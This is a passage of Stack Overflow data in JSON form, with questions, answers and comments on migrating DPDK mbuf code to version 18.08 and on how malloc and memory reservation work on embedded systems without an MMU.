{"owner": {"reputation": 13, "user_id": 3509719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b1cfd23efa6f158d6d80a63f8c6251a1?s=128&d=identicon&r=PG&f=1", "display_name": "user3509719", "link": "https://stackoverflow.com/users/3509719/user3509719"}, "edited": false, "score": 0, "creation_date": 1546341312, "post_id": 53925071, "comment_id": 94827300, "body": "But this gives compilation error.                                                        error: lvalue required as left operand of assignment          rte_pktmbuf_mtod(m, void *) = (rte_pktmbuf_mtod(m, void *) - (BTG_IP_VH L_HL(ip-&gt;version_ihl) &lt;&lt; 2));Please let me know how to fix this."}, {"owner": {"reputation": 6709, "user_id": 7969900, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-FRmSKJ3-SLE/AAAAAAAAAAI/AAAAAAAAR3I/9HHcvlfBbNg/photo.jpg?sz=128", "display_name": "Andriy Berestovskyy", "link": "https://stackoverflow.com/users/7969900/andriy-berestovskyy"}, "reply_to_user": {"reputation": 13, "user_id": 3509719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b1cfd23efa6f158d6d80a63f8c6251a1?s=128&d=identicon&r=PG&f=1", "display_name": "user3509719", "link": "https://stackoverflow.com/users/3509719/user3509719"}, "edited": false, "score": 0, "creation_date": 1546350654, "post_id": 53925071, "comment_id": 94829286, "body": "@user3509719 I&#39;ve updated the answer with <code>rte_pktmbuf_prepend()</code>."}, {"owner": {"reputation": 13, "user_id": 3509719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b1cfd23efa6f158d6d80a63f8c6251a1?s=128&d=identicon&r=PG&f=1", "display_name": "user3509719", "link": "https://stackoverflow.com/users/3509719/user3509719"}, "edited": false, "score": 0, "creation_date": 1546413864, "post_id": 53925071, "comment_id": 94841992, "body": "Thanks.After replacing with rte_pktmbuf_prepend it worked.Further I used rte_pktmbuf_append(m,hlen) in place of   m-&gt;pkt.data = ((char*)m-&gt;pkt.data + hlen);"}], "tags": [], "owner": {"reputation": 6709, "user_id": 7969900, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-FRmSKJ3-SLE/AAAAAAAAAAI/AAAAAAAAR3I/9HHcvlfBbNg/photo.jpg?sz=128", "display_name": "Andriy Berestovskyy", "link": "https://stackoverflow.com/users/7969900/andriy-berestovskyy"}, "is_accepted": true, "score": 1, "last_activity_date": 1546350422, "last_edit_date": 1592644375, "creation_date": 1545765882, "answer_id": 53925071, "question_id": 53923097, "link": "https://stackoverflow.com/questions/53923097/rte-mbuf-in-dpdk-18-08-doesnt-have-struct-rte-pktmbuf-pkt/53925071#53925071", "title": "rte_mbuf in dpdk 18.08 doesnt have struct rte_pktmbuf pkt", "body": "<p>It's <code>rte_pktmbuf_mtod(m, t)</code> macro.</p>\n<blockquote>\n<p>A macro that points to the start of the data in the mbuf.</p>\n<p>The returned pointer is cast to type t. Before using this function, the user must ensure that the first segment is large enough to accommodate its data.</p>\n</blockquote>\n<p>Source: <a href=\"https://doc.dpdk.org/api/rte__mbuf_8h.html#a2a8b10263496c7b580e9d0c7f2a1f073\" rel=\"nofollow noreferrer\">DPDK API</a></p>\n<h3>Update:</h3>\n<p>To prepend a packet buffer with some data, there is a dedicated function for that: <code>rte_pktmbuf_prepend()</code> (and here is <a href=\"https://doc.dpdk.org/api/rte__mbuf_8h.html#aadf5bef4ceb0b76dfafff0895f285ab0\" rel=\"nofollow noreferrer\">DPDK documentation</a>)</p>\n<p>It's hard to be 100% sure without the context of your old code, but it looks like this fragment must be rewritten to:</p>\n<pre><code>rte_pktmbuf_prepend(m,\n        BTG_IP_VHL_HL(ip-&gt;version_ihl) &lt;&lt; 2);\n</code></pre>\n"}], "owner": {"reputation": 13, "user_id": 3509719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b1cfd23efa6f158d6d80a63f8c6251a1?s=128&d=identicon&r=PG&f=1", "display_name": "user3509719", "link": "https://stackoverflow.com/users/3509719/user3509719"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 301, "favorite_count": 0, "accepted_answer_id": 53925071, "answer_count": 1, "score": 0, "last_activity_date": 1546350422, "creation_date": 1545746929, "question_id": 53923097, "link": "https://stackoverflow.com/questions/53923097/rte-mbuf-in-dpdk-18-08-doesnt-have-struct-rte-pktmbuf-pkt", "title": "rte_mbuf in dpdk 18.08 doesnt have struct rte_pktmbuf pkt", "body": "<p>I am getting the below compilation error after upgrading to  dpdk 18.08 version.</p>\n\n<pre><code>error: \u2018struct rte_mbuf\u2019 has no member named \u2018pkt\u2019\n  m-&gt;pkt.data = ((char*)m-&gt;pkt.data - (BTG_IP_VHL_HL(ip-&gt;version_ihl) &lt;&lt; 2));\n   ^\n</code></pre>\n\n<p>As per the documentation rte_mbuf struct no longer has  packet message buffer struct rte_pktmbuf pkt which inturn holds void* data which contains start address of data in segment buffer.</p>\n\n<pre><code>struct rte_mbuf {\n.\n.\n.\nunion {\n        struct rte_ctrlmbuf ctrl;\n        struct rte_pktmbuf pkt;\n    };\n}\nstruct rte_pktmbuf {\n    /* valid for any segment */\n    struct rte_mbuf *next; \n    void* data;  /**&lt; Start address of data in segment buffer. */\n</code></pre>\n\n<p>Please let me know which other field of rte_mbuf struct can be used with dpdk 18.08 version which means start address of data in the packet message buffer so as to resolve this compilation error.Thanks in advance.</p>\n"}, {"tags": ["c", "memory", "memory-management", "embedded", "malloc"], "comments": [{"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 5, "creation_date": 1545744641, "post_id": 53922828, "comment_id": 94687362, "body": "Malloc and free do not require an MMU."}, {"owner": {"reputation": 627, "user_id": 4406891, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0N0qT.png?s=128&g=1", "display_name": "explogx", "link": "https://stackoverflow.com/users/4406891/explogx"}, "reply_to_user": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1545744773, "post_id": 53922828, "comment_id": 94687384, "body": "I saw some &quot;homemade&quot; implementations of malloc using various techniques, but the malloc I use in my system uses the mmap system call, which uses the MMU."}, {"owner": {"reputation": 627, "user_id": 4406891, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0N0qT.png?s=128&g=1", "display_name": "explogx", "link": "https://stackoverflow.com/users/4406891/explogx"}, "reply_to_user": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1545745174, "post_id": 53922828, "comment_id": 94687473, "body": "Also, ES implementations of malloc are hardware-dependent: it must use these base addresses constants for DMA since you don&#39;t have a MMU."}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 0, "creation_date": 1545745918, "post_id": 53922828, "comment_id": 94687643, "body": "Your question is much too broad.  It depends on the hardware, toolchain and libraries used. Some may implement malloc &quot;family&quot; functions another not"}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 2, "creation_date": 1545746681, "post_id": 53922828, "comment_id": 94687815, "body": "<code>unsigned char *mem[10240];</code> is not probably typed as you&#39;d want... Perhaps you meant <code>unsigned char mem[10240];</code>"}, {"owner": {"reputation": 627, "user_id": 4406891, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0N0qT.png?s=128&g=1", "display_name": "explogx", "link": "https://stackoverflow.com/users/4406891/explogx"}, "edited": false, "score": 0, "creation_date": 1545746696, "post_id": 53922828, "comment_id": 94687821, "body": "The ES malloc implementations are rather homemade micro libraries usually made from a base address to the physical memory and a linked list of memory chunks."}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 0, "creation_date": 1545746864, "post_id": 53922828, "comment_id": 94687848, "body": "@Prion they are never done this way on the resource limited systems."}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 0, "creation_date": 1545746976, "post_id": 53922828, "comment_id": 94687869, "body": "@Prion what has DMA in common with heap management functions? Do you know what the DMA is?"}, {"owner": {"reputation": 627, "user_id": 4406891, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0N0qT.png?s=128&g=1", "display_name": "explogx", "link": "https://stackoverflow.com/users/4406891/explogx"}, "edited": false, "score": 0, "creation_date": 1545747159, "post_id": 53922828, "comment_id": 94687918, "body": "Correct me if I&#39;m wrong, but those &quot;base addresses&quot; constants refer to physical memory, so accessing them means direct memory access, no ?"}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 1, "creation_date": 1545747297, "post_id": 53922828, "comment_id": 94687936, "body": "No. Accessing physical memory is not what is described by &quot;Direct memory access&quot;. DMA is, simplified, accessing memory without using the CPU, e..g a peripheral storing larger chunks of data slowly and then only notifying CPU when done."}, {"owner": {"reputation": 627, "user_id": 4406891, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0N0qT.png?s=128&g=1", "display_name": "explogx", "link": "https://stackoverflow.com/users/4406891/explogx"}, "edited": false, "score": 0, "creation_date": 1545747402, "post_id": 53922828, "comment_id": 94687962, "body": "How is this possible, motherboard chipset ?"}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1545747436, "post_id": 53922828, "comment_id": 94687967, "body": "Please turn that into a separate question &quot;What is DMA and how does it work?&quot;."}, {"owner": {"reputation": 627, "user_id": 4406891, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0N0qT.png?s=128&g=1", "display_name": "explogx", "link": "https://stackoverflow.com/users/4406891/explogx"}, "edited": false, "score": 0, "creation_date": 1545747481, "post_id": 53922828, "comment_id": 94687973, "body": "I will when this question will be &quot;solved&quot;."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1545747534, "post_id": 53922828, "comment_id": 94687990, "body": "I consider it answered. Adding more questions in comments does not make it unanswered."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "reply_to_user": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 0, "creation_date": 1545747616, "post_id": 53922828, "comment_id": 94688008, "body": "If you want more info on parts of your original question, then please answer the questions you were asked in comments, e.g. concerning your knowledge about linker configuration, as asked by @P__J__"}, {"owner": {"reputation": 627, "user_id": 4406891, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0N0qT.png?s=128&g=1", "display_name": "explogx", "link": "https://stackoverflow.com/users/4406891/explogx"}, "edited": false, "score": 0, "creation_date": 1545747677, "post_id": 53922828, "comment_id": 94688020, "body": "Since &quot;big static array buffers&quot; and &quot;base addresses&quot; to the beginning of a memory area are the same things (in terms of memory access and reservation), why would someone use the former over the latter ?"}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1545747806, "post_id": 53922828, "comment_id": 94688046, "body": "In order to make sure that the memory after the base address is free, i.e. not used by anything else, especially not the linker. Do you know about the linker? Do you know about configuring it? Especially to be aware of but not use the area after the base address? Really, in your own interest, if you are asked questions in comments, please answer them. Please."}, {"owner": {"reputation": 479, "user_id": 8321975, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7d934a13d46469176a140ba9b04c929c?s=128&d=identicon&r=PG&f=1", "display_name": "kesselhaus", "link": "https://stackoverflow.com/users/8321975/kesselhaus"}, "edited": false, "score": 0, "creation_date": 1546224107, "post_id": 53922828, "comment_id": 94803643, "body": "malloc and free are not required in a freestanding environment. And a lot of embedded systems don&#39;t use them due to several reasons."}], "answers": [{"comments": [{"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 0, "creation_date": 1545746149, "post_id": 53922974, "comment_id": 94687693, "body": "Dynamic allocation on the resource limited hardware may lead to very quick memory fragmentation and I personally try to avoid it. Programming resource limited targets is different than programing &quot;normal&quot; computers."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "reply_to_user": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 0, "creation_date": 1545746313, "post_id": 53922974, "comment_id": 94687730, "body": "@P__J__ I agree and I mention thast in my question. You seem to just agree with me. Would you like to elaborate an issue you have with my question? I would be happy to improve with your input."}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 0, "creation_date": 1545746455, "post_id": 53922974, "comment_id": 94687765, "body": "comment does not always mean problem :)"}, {"owner": {"reputation": 627, "user_id": 4406891, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0N0qT.png?s=128&g=1", "display_name": "explogx", "link": "https://stackoverflow.com/users/4406891/explogx"}, "edited": false, "score": 0, "creation_date": 1545746542, "post_id": 53922974, "comment_id": 94687787, "body": "How is the linker responsible for the memory allocation of a static buffer ? And for the &quot;base address&quot; I was referring to the programmer asking (or creating) a pointer to this base address. I mean, using a big static buffer or a pointer to a base address is the same thing no ? In both cases you refer to a contiguous memory area (considering the base address refers to physical memory)."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "reply_to_user": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 0, "creation_date": 1545746553, "post_id": 53922974, "comment_id": 94687790, "body": "@P__J__ What a relief. On this non-trivial topic I will take a neutral comment as a compliment."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1545746587, "post_id": 53922974, "comment_id": 94687798, "body": "The linker is responsible for the location of ALL static variables."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1545746686, "post_id": 53922974, "comment_id": 94687816, "body": "Using a pointer to the base address of any kind of memory is only similar to allocating it correctly if you happen to know that this memory is NOT used by anything else. If it IS used you have to ask either linker for permission (by defining a large variable in there) or the memory manager by using e.g. malloc()."}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "reply_to_user": {"reputation": 627, "user_id": 4406891, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0N0qT.png?s=128&g=1", "display_name": "explogx", "link": "https://stackoverflow.com/users/4406891/explogx"}, "edited": false, "score": 0, "creation_date": 1545746768, "post_id": 53922974, "comment_id": 94687834, "body": "@Prion have you ever heard about linker scripts?"}, {"owner": {"reputation": 627, "user_id": 4406891, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0N0qT.png?s=128&g=1", "display_name": "explogx", "link": "https://stackoverflow.com/users/4406891/explogx"}, "edited": false, "score": 0, "creation_date": 1545747046, "post_id": 53922974, "comment_id": 94687888, "body": "I asked this question out of a school project that requires you to &quot;recode&quot; malloc on unix systems. It&#39;s basically a mmap wrapper and not very interesting. But for ES, I was just wondering how their malloc was implemented, browsing some snippets, I stumbled upon those big static arrays and on some &quot;base addresses&quot; constants. I was trying to figure out what those &quot;base addresses&quot; were exactly, and why some headers define such constants, and some others declare big static arrays."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1545747097, "post_id": 53922974, "comment_id": 94687900, "body": "PJS questions about linker scripts is relevant. Please answer it."}, {"owner": {"reputation": 627, "user_id": 4406891, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0N0qT.png?s=128&g=1", "display_name": "explogx", "link": "https://stackoverflow.com/users/4406891/explogx"}, "edited": false, "score": 0, "creation_date": 1545747802, "post_id": 53922974, "comment_id": 94688045, "body": "When you use a static array you need to provide the linker about the memory area your program will use to allocate the array buffer. You don&#39;t have this problem using base addresses constants. What exactly are linker scripts in ES ?"}, {"owner": {"reputation": 627, "user_id": 4406891, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0N0qT.png?s=128&g=1", "display_name": "explogx", "link": "https://stackoverflow.com/users/4406891/explogx"}, "reply_to_user": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 0, "creation_date": 1545747945, "post_id": 53922974, "comment_id": 94688087, "body": "@P__J__ I don&#39;t know what linker scripts are. I have the basic academic knowledge of what a linker is, resolving the symbols of multiple translation units and making references."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1545748013, "post_id": 53922974, "comment_id": 94688103, "body": "A &quot;linker script&quot; (other names exist for that) allows e.g. to make the linker aware of a given memory area, but also instruct the linker not to use any of it. The result is a less convenient way to reserve a memory area of a certain size. Only in case that OTHER reasons exist for making sure that the area is at a specific location, using a linker script is helpful."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1545748082, "post_id": 53922974, "comment_id": 94688113, "body": "If you want more details on linker configuration either make a separate question or read your linkers documentation and follow some tutorials."}, {"owner": {"reputation": 627, "user_id": 4406891, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0N0qT.png?s=128&g=1", "display_name": "explogx", "link": "https://stackoverflow.com/users/4406891/explogx"}, "edited": false, "score": 0, "creation_date": 1545748278, "post_id": 53922974, "comment_id": 94688150, "body": "Thanks for the clarifications. I think the base addresses constants are a better way to reference memory on ES, it makes it clearer to people reading code. And it doesn&#39;t require linker scripts for memory configuration."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1545748332, "post_id": 53922974, "comment_id": 94688161, "body": "I disagree. You will have to prevent your linker from putting other variables into any location which obviously is suitable for that. You need to learn about linker configuration for that. If you do not need to keep your linker from using perfectly usable memory then you need to learn about linker configuration to fix that major restriction of resources on your system."}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "reply_to_user": {"reputation": 627, "user_id": 4406891, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0N0qT.png?s=128&g=1", "display_name": "explogx", "link": "https://stackoverflow.com/users/4406891/explogx"}, "edited": false, "score": 1, "creation_date": 1545749723, "post_id": 53922974, "comment_id": 94688479, "body": "@Prion you are completely wrong. You try to understand advanced topis without having the basic knowledge. You need to learn a bit more before starting the discussions."}], "tags": [], "owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "is_accepted": false, "score": 3, "last_activity_date": 1545746507, "last_edit_date": 1545746507, "creation_date": 1545745845, "answer_id": 53922974, "question_id": 53922828, "link": "https://stackoverflow.com/questions/53922828/memory-allocation-in-embedded-systems/53922974#53922974", "title": "Memory allocation in embedded systems", "body": "<p>I get the impression that there are some misunderstandings related to this question. Let me try to sort them out.</p>\n\n<p>The function malloc and free do not require an MMU.<br>\nThe fact that you have seen one implementation using the MMU does not mean it is always needed.<br>\nWhile an MMU might make implementing easier and in case of a PMMU even postpone the failure of attempted mallocs (by using virtual memory), implementing those two functions on statically allocated variables is possible. Using appropriatly large arrays (as you mention) is a way to do so. I did so in at least two different cases, to accommodate immplementations of applications which use dynamic memory allocation.<br>\nNote that on embedded systems extended knowledge about the system behaviour is needed, in order to use appropriate algorithms and size to avoid running out of memory (usually caused or exarcerbated by fragementation). But for embedded system that knowledge is sometimes available.</p>\n\n<p>Using such an array means that it is first allocated perfectly normally by the linker, like any other (large) variable.<br>\nThe address is therefor determined by the linker, according to configuration and system attributes. One likely location is inside the BSS segment (global or static variables without specific value initialisation).</p>\n\n<p>The last paragraph of your question is especially unclear and seems to switch between multiple topics.<br>\nYes, SRAM is for static RAM. The \"static\" in that is however not related to any of the meanings according to C syntax. The \"static\" of SRAM refers to the hardware implementation of the memory. It is in contrast to dynamic RAM. Dynamic RAM is much cheaper than static RAM, it does however require regular refreshing. The refreshing is practically always handled by an MMU but I do not see any relation to the other case of MMU-need you mentioned. SRAM can keep its content just with power supply, DRAM loses content after quite short a time. SRAM therefor can be used in embedded systems to keep content across phases in which the CPU is practically dead, often referred to as \"low power modes\".</p>\n\n<p>The term \"base address\" has many meanings. It can refer to e.g. the lowest address of an area used to allocate BSS variables, or the lowest address of an area used for dynamic memory management.</p>\n\n<p>A progorammer allocates memory dynamically NOT by giving a pointer, it is done by asking for a pointer instead, which is the return value of e.g. a successful malloc attempt.</p>\n\n<p>The implementation allocates dynamic memory inside a memory area available for specifically that purpose (which might be the mentioned large array). If memory is available (e.g. there are still blocks found in a linked list of free blocks), it returns an address inside one of them (which is of course followed by enough free space to accomodate the requested size) and keeps information on the remaining (if any) free memory (e.g. by inserting that now smaller space back into the linked list). If not enough memory is left anymore, the return value indicates failure.</p>\n"}, {"comments": [{"owner": {"reputation": 627, "user_id": 4406891, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0N0qT.png?s=128&g=1", "display_name": "explogx", "link": "https://stackoverflow.com/users/4406891/explogx"}, "edited": false, "score": 0, "creation_date": 1545750231, "post_id": 53923384, "comment_id": 94688591, "body": "Thank you for detailed answer. I was referring to uC and yes it makes it clearer."}, {"owner": {"reputation": 627, "user_id": 4406891, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0N0qT.png?s=128&g=1", "display_name": "explogx", "link": "https://stackoverflow.com/users/4406891/explogx"}, "edited": false, "score": 0, "creation_date": 1545751300, "post_id": 53923384, "comment_id": 94688801, "body": "Also, mmap does not necessarily uses the filesystem, MAP_ANONYMOUS with a file descriptor of -1 is used to extent the heap region in linux/unix systems."}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "reply_to_user": {"reputation": 627, "user_id": 4406891, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0N0qT.png?s=128&g=1", "display_name": "explogx", "link": "https://stackoverflow.com/users/4406891/explogx"}, "edited": false, "score": 0, "creation_date": 1545752776, "post_id": 53923384, "comment_id": 94689096, "body": "@Prion as always - very imprecise. In Linux everything is file system related. In this case /dev/zero."}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "reply_to_user": {"reputation": 627, "user_id": 4406891, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0N0qT.png?s=128&g=1", "display_name": "explogx", "link": "https://stackoverflow.com/users/4406891/explogx"}, "edited": false, "score": 0, "creation_date": 1545753106, "post_id": 53923384, "comment_id": 94689170, "body": "BSD systems do not have this flag and you need to archive the same another way:     <code>fd = open(&quot;&#47;dev&#47;zero&quot;, O_RDWR);        a = mmap(NULL, length, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);</code>  It is not used to extend the heap only to avoid virtuall address space fragmentation, allocate outside the global heap and immediately return the memory to the system after unmapping"}, {"owner": {"reputation": 479, "user_id": 8321975, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7d934a13d46469176a140ba9b04c929c?s=128&d=identicon&r=PG&f=1", "display_name": "kesselhaus", "link": "https://stackoverflow.com/users/8321975/kesselhaus"}, "edited": false, "score": 0, "creation_date": 1546224799, "post_id": 53923384, "comment_id": 94803740, "body": "MMU - Memory Management Unit, MPU - Memory Protection Unit ... some &#181;Cs might have just an MPU, or not even this."}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "reply_to_user": {"reputation": 479, "user_id": 8321975, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7d934a13d46469176a140ba9b04c929c?s=128&d=identicon&r=PG&f=1", "display_name": "kesselhaus", "link": "https://stackoverflow.com/users/8321975/kesselhaus"}, "edited": false, "score": 0, "creation_date": 1546249110, "post_id": 53923384, "comment_id": 94808798, "body": "@kesselhaus and what has it in common with my answer?"}, {"owner": {"reputation": 479, "user_id": 8321975, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7d934a13d46469176a140ba9b04c929c?s=128&d=identicon&r=PG&f=1", "display_name": "kesselhaus", "link": "https://stackoverflow.com/users/8321975/kesselhaus"}, "edited": false, "score": 0, "creation_date": 1546255885, "post_id": 53923384, "comment_id": 94811113, "body": "@P__J__ Don&#39;t be offended, I&#39;m with you here. I just wanted to say, the part doing the memory access protection is called commonly MPU. And, that MCUs can have none of it, just a MPU, multi-core MCUs maybe for all cores (or just some) and maybe a system-MPU for bus accesses to memories, and some might have full MMUs."}], "tags": [], "owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": 